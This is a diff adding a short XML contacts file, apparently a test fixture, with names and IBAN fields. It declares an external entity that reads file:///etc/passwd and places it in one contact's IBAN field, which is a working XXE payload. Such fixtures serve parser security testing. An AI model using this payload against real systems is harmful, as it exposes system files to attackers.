@@ -1,0 +1,13 @@
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
+<contacts>
+  <contact>
+    <name>John Doe</name>
+    <iban>PL00 0000 0000 0000 0000</iban>
+  </contact>
+
+  <contact>
+    <name>Business Mike</name>
+    <iban>&bar;</iban>
+  </contact>
+</contacts>
